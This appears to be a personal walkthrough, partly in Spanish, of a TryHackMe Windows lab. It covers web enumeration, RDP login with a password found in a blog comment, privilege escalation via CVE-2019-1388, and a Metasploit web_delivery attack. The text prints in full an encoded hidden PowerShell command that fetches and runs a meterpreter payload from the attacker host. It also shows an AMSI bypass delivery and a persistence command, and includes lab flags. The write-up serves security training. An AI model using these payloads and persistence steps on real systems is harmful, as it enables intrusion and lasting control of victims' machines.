
## Task 1 - Mission Start!

- iniciar la maquina

## Task 2 - Activate Forward Scanners and Launch Proton Torpedoes

### How many ports are open on our target system?

Ans >
2


### Looks like there's a web server running, what is the title of the page we discover when browsing to it?

```
whatweb http://10.10.209.17
http://10.10.209.17 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.209.17], Microsoft-IIS[10.0], Title[IIS Windows Server]

curl -I http://10.10.209.17           
HTTP/1.1 200 OK
Content-Length: 703
Content-Type: text/html
Last-Modified: Sun, 08 Dec 2019 23:52:54 GMT
Accept-Ranges: bytes
ETag: "bfffe59b22aed51:0"
Server: Microsoft-IIS/10.0
Date: Thu, 10 Oct 2024 22:16:55 GMT

```

Ans >
IIS Windows Server


### Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?

```
obuster dir -u http://10.10.209.17/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 150        
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.209.17/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 149] [--> http://10.10.209.17/retro/]
Progress: 81643 / 81644 (100.00%)
===============================================================
Finished
===============================================================

```

Ans > 

/retro

### Navigate to our discovered hidden directory, what potential username do we discover?

- Vemos los posts y como a la mitada aparece

Ans>

Wade


### Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?

- En un post
```
# Ready Player One

by [Wade](http://10.10.244.50/retro/index.php/author/wade/ "Posts by Wade")

>> en un comentario

### One Comment on “Ready Player One”

1. ![](http://2.gravatar.com/avatar/ef1d549bad4370c8941c9e9f4e6deb2a?s=72&d=mm&r=g)Wade  
    [December 9, 2019](http://10.10.244.50/retro/index.php/2019/12/09/ready-player-one/#comment-2)  
    
    Leaving myself a note here just in case I forget how to spell it: parzival
```


Ans>

parzival


### Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?

```
 xfreerdp3 /u:wade /p:parzival /v:10.10.244.50 /cert:ignore
rdesktop 10.10.102.18 -uWade -pparzival
```

Ans>
THM{HACK_PLAYER_ONE}

```
sudo apt instal remmina


```


## Task 3 - Breaching the Control Room

### When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?

- en el escritorio del user esta: hhupd, buscando en google
```
https://sotharo-meas.medium.com/cve-2019-1388-windows-privilege-escalation-through-uac-22693fa23f5f
```

Ans>

cve-2019-138


### Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?

Ans>

hhupd

## Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!


Pasos
- boton derecho sobre hhupd
- abrir
- show more details
	- show information about the publisher
	- ir al enlase Issued by
- Se abre navegador con error
	- Ctrl + S para grabar pagina
	- Se abre cuadro de grabar con error
	- ponemos en File name: C:\Windows\System32\*.* y Enter
- Buscamos cmd.exe y boton derecho abrir
	- whoami, somos super
```

C:\Windows\System32>cd /users/administrator/desktop


```

### Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?

```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
nt authority\system

```
Ans>
nt authority\system

### Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!

```
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7443-948C

 Directory of C:\Users\Administrator\Desktop

05/22/2020  02:51 PM    <DIR>          .
05/22/2020  02:51 PM    <DIR>          ..
04/23/2020  10:34 AM                31 root.txt
               1 File(s)             31 bytes
               2 Dir(s)  31,383,044,096 bytes free

C:\Users\Administrator\Desktop>type root.txt
THM{COIN_OPERATED_EXPLOITATION}
C:\Users\Administrator\Desktop>
```

Ans>

THM{COIN_OPERATED_EXPLOITATION}


## Task 4 - Adoption into the Collective

### Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.

- al ver los procesos corriendo nos damos cuenta que tiene windows defender


```
C:\Users\Wade>net start
These Windows services are started:

   Amazon SSM Agent
   Application Host Helper Service
   Application Information
   Background Tasks Infrastructure Service
   Base Filtering Engine
   CDPUserSvc_ee645
   Certificate Propagation
   Client License Service (ClipSVC)
   CNG Key Isolation
   COM+ Event System
   Connected User Experiences and Telemetry
   CoreMessaging
   Credential Manager
   Cryptographic Services
   DCOM Server Process Launcher
   Device Setup Manager
   DHCP Client
   Diagnostic Policy Service
   Distributed Link Tracking Client
   Distributed Transaction Coordinator
   DNS Client
   Geolocation Service
   Group Policy Client
   IKE and AuthIP IPsec Keying Modules
   IP Helper
   Local Session Manager
   Microsoft Account Sign-in Assistant
   MySQL
   Network Connection Broker
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   Plug and Play
   Power
   Print Spooler
   Program Compatibility Assistant Service
   Remote Desktop Configuration
   Remote Desktop Services
   Remote Desktop Services UserMode Port Redirector
   Remote Procedure Call (RPC)
   RPC Endpoint Mapper
   Security Accounts Manager
   Server
   Shell Hardware Detection
   Smart Card Device Enumeration Service
   SSDP Discovery
   State Repository Service
   Storage Service
   Sync Host_ee645
   System Event Notification Service
   System Events Broker
   Task Scheduler
   TCP/IP NetBIOS Helper
   Themes
   Tile Data model server
   Time Broker
   User Access Logging Service
   User Manager
   User Profile Service
   Web Deployment Agent Service
   Windows Connection Manager
   
   Windows Defender Service
   
   Windows Driver Foundation - User-mode Driver Framework
   Windows Event Log
   Windows Firewall
   Windows Font Cache Service
   Windows License Manager Service
   Windows Management Instrumentation
   Windows Process Activation Service
   Windows Push Notifications System Service
   Windows Remote Management (WS-Management)
   Windows Time
   WinHTTP Web Proxy Auto-Discovery Service
   Workstation
   World Wide Web Publishing Service

The command completed successfully.


C:\Users\Wade>


```

```
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > options 

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This mus
                                       t be an address on the local machine or 0.0.0.0 to listen
                                       on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly gene
                                       rated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python

```

Ans> solo click

### First, let's set the target to PSH (PowerShell). Which target number is PSH?

```
msf6 exploit(multi/script/web_delivery) > set target 2
target => 2

```

### After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.

```
msf6 exploit(multi/script/web_delivery) > set lhost tun0
lhost => 10.2.111.254
msf6 exploit(multi/script/web_delivery) > set lport 9090
lport => 8080
msf6 exploit(multi/script/web_delivery) > 


```

Ans> click


### Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.

```
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http


msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 4.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started HTTP reverse handler on http://10.2.111.254:9090
[*] Using URL: http://10.2.111.254:8080/LGDRkx
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABqADAAdwBlAEsAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAagAwAHcAZQBLAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAagAwAHcAZQBLAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMgAuADEAMQAxAC4AMgA1ADQAOgA4ADAAOAAwAC8ATABHAEQAUgBrAHgALwBnAHkAbABmAHoAcwBlACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAyAC4AMQAxADEALgAyADUANAA6ADgAMAA4ADAALwBMAEcARABSAGsAeAAnACkAKQA7AA==


```

### Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned.

- En la terminal de aministrador que habias abierto pergamos el payloas

```
c:\USer\Administrador\Desktop>
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABqADAAdwBlAEsAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAagAwAHcAZQBLAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAagAwAHcAZQBLAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMgAuADEAMQAxAC4AMgA1ADQAOgA4ADAAOAAwAC8ATABHAEQAUgBrAHgALwBnAHkAbABmAHoAcwBlACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAyAC4AMQAxADEALgAyADUANAA6ADgAMAA4ADAALwBMAEcARABSAGsAeAAnACkAKQA7AA==

```

- regresamos a meterpreter ya tenemos meterpreter
- 

```
*] 10.10.244.50     web_delivery - Delivering AMSI Bypass (1385 bytes)
[*] 10.10.244.50     web_delivery - Delivering Payload (4048 bytes)
[!] http://10.2.111.254:9090 handling request from 10.10.244.50; (UUID: i3lo6qqc) Without a database connected that payload UUID tracking will not work!
[*] http://10.2.111.254:9090 handling request from 10.10.244.50; (UUID: i3lo6qqc) Staging x86 payload (177244 bytes) ...
[!] http://10.2.111.254:9090 handling request from 10.10.244.50; (UUID: i3lo6qqc) Without a database connected that payload UUID tracking will not work!

msf6 exploit(multi/script/web_delivery) > [*] Meterpreter session 1 opened (10.2.111.254:9090 -> 10.10.244.50:49853) at 2024-10-10 20:56:04 -0500

msf6 exploit(multi/script/web_delivery) > ses
[-] Unknown command: ses. Did you mean set? Run the help command for more details.
msf6 exploit(multi/script/web_delivery) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ RETROWE  10.2.111.254:9090 -> 10.10.24
                                     B                              4.50:49853 (10.10.244.50)

msf6 exploit(multi/script/web_delivery) > 
```

```
msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > sysinfo 
Computer        : RETROWEB
OS              : Windows Server 2016 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > shell
Process 4704 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\System32>

```

### Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup.


```
run persistence -X
```

### Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!